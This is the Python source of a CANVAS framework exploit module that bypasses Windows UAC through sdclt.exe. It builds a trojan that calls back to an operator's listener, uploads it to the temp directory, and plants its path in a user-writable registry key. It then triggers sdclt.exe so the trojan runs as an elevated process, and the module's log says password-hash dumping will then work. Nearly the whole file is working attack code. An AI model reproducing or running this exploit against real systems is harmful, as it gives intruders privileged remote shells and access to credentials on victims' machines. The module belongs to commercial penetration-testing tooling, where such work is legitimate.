#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
import time

from exploitutils import *

from canvasexploit import canvasexploit
import canvasengine
import random
from canvaserror import *

from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

from WindowsConstants import KEY_ALL_ACCESS
from WindowsConstants import HKEY_CURRENT_USER

from libs.canvasos import canvasos

NAME                            = "sdclt_uac_bypass"
DESCRIPTION                     = "Specify a command inside of a user-writable registry and SDCLT will execute as a High-IL process"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["Date public"]    = "3/17/2017"
DOCUMENTATION["CVE Name"]       = None
DOCUMENTATION["CVE Url"]        = None
DOCUMENTATION['CVSS']           = None
DOCUMENTATION["URL"]            = ""
DOCUMENTATION["References"]     = ["https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/",
                                   "https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1",
]

DOCUMENTATION["Notes"] = """
Tests:
- Windows 7 x86       - UNTESTED
- Windows 8.1 x86_64  - UNTESTED
- Windows 10 x86_64   - SUCCESSFUL

"""

VERSION          = "1.0"

PROPERTY         = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows", "x86"],
                     ["Windows", "x64"]]

EVIL_REG_KEY = "Software\\Classes\\exefile\\shell\\runas\\command"


from win32MosdefShellServer import win32shellserver
from MOSDEF.pelib import PElib

import struct


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)

        self.name = NAME
        self.setVersions()
        self.use_local_interface = False
        self.cleanup_files = []

    def setVersions(self):
        self.versions={}
        self.versions[0]=("Automatic")

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        return

    def test(self):
        return 1

    def setup_registry_key(self, callback_path):
        key_handle = self.node.shell.get_reg_key_handle(HKEY_CURRENT_USER, EVIL_REG_KEY, KEY_ALL_ACCESS)

        if key_handle == None:
            logging.error("Could not open registry key %s" % EVIL_REG_KEY)
            return False
        else:
            del_status = self.node.shell.RegDeleteKeyEx(key_handle, "IsolatedCommand")
            logging.info("RegDeleteKeyEx returned %s" % (str(del_status)))
            self.node.shell.RegCloseKey(key_handle)

            logging.info("Setting value of %s\\(Default) to string %s" % (EVIL_REG_KEY, callback_path))

            key_handle = self.node.shell.get_reg_key_handle(HKEY_CURRENT_USER,
                                                            EVIL_REG_KEY,
                                                            KEY_ALL_ACCESS)
            (return_value, error_code) = self.node.shell.RegSetValueEx(key_handle, "IsolatedCommand", "REG_SZ", callback_path+"\x00")

            if not return_value:
                logging.error("Failed to set (default) equal to %s" % str(callback_path))
                return False

            self.node.shell.RegCloseKey(key_handle)

        return True

    def spawn_event_viewer(self):
        path = "sdclt.exe"

        logging.info("Spawning SDCLT utility at %s" % path)
        ret = self.node.shell.CreateProcessA("powershell.exe -Command \"sdclt.exe /KickOffElev\"", dwCreationFlags=0x08000000)

        if not ret:
            logging.error("Failed to execute EventViewer")
            return False

        return True


    def run_attack(self):
        if self.is_win10_node():
            if self.get_releaseid >= 1709:
                return False

        (local_callback_path, remote_callback_path) = self.plant_trojan()

        os.unlink(local_callback_path)
        if local_callback_path != None and remote_callback_path != None:
            if not self.setup_registry_key(remote_callback_path):
                self.node.unlink(remote_callback_path)
            else:
                self.spawn_event_viewer()

                logging.info("Waiting for elevated MOSDEF shell connection...")
                logging.info("getpasswordhashes and other privileged commands will work if the user is an administrator")
                return True

        return False

    def plant_trojan(self):
        tmp_path = self.node.shell.GetTempPathA()
        remote_callback_path = None
        local_callback_path = None

        if not tmp_path:
            logging.error('Could not resolve full temp dir path')
            return (None, None)
        else:
            logging.info('Temp dir: %s' % tmp_path)

            if self.node.shell.chdir(tmp_path) < 0:
                logging.error('Could not chdir into %s' % tmp_path)
                return (None, None)

            local_callback_path = self.create_callback()
            remote_callback_path = tmp_path + os.path.basename(local_callback_path)

            if not self.nodeUpload(local_callback_path, remote_callback_path):
                logging.error('Error while uploading callback')
                return (None, None)

        return (local_callback_path, remote_callback_path)


    def create_callback(self):
        t_os = canvasos('WINDOWS')
        t_os.arch = 'X64' if self.is_64bit_node() or self.has_wow64() else 'X86'

        logging.info("Building callback to ip:%s, port:%d, architecture:%s" % (self.callback.ip, self.callback.port, t_os.arch))
        self.buildmosdeftrojan(self.callback.ip, self.callback.port, t_os, universal=True)
        callback_path = os.path.join(self.output(ip=self.node.get_interesting_interface(),
                                                 subdir="sdclt_uac_bypass"), "%d.exe" % random.randint(0, 100000000))

        with open(callback_path, "wb") as handle:
            handle.write(self.mosdeftrojan)

        return callback_path

    def run(self):
        """
        This run happens on all nodes selected
        returns 1 if we succeed on any node
        """
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()

        success = False

        for node in self.argsDict["passednodes"]:
            self.summary[node] = 0
            self.node = node

            result = self.run_attack()

            self.summary[node] = result
            success &= result

        return success

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
